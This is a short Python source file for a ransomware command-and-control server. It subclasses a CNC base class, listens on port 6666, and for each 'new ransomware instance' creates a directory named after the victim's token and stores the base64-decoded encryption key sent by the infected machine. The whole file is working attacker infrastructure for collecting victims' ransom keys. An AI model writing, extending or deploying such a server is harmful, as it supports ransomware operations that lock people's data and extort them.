import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import logging

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 fields

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # used to register new ransomware instance
        token = params['token']
        os.mkdir(CNC.ROOT_PATH + '/' + token)
        self._log.info(path, params, body)
        self.save_b64(token, body['key'], "bite.bin")

        return {"status":"OK"}

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    httpd = HTTPServer(('0.0.0.0', 6666), CNC)
    httpd.serve_forever()
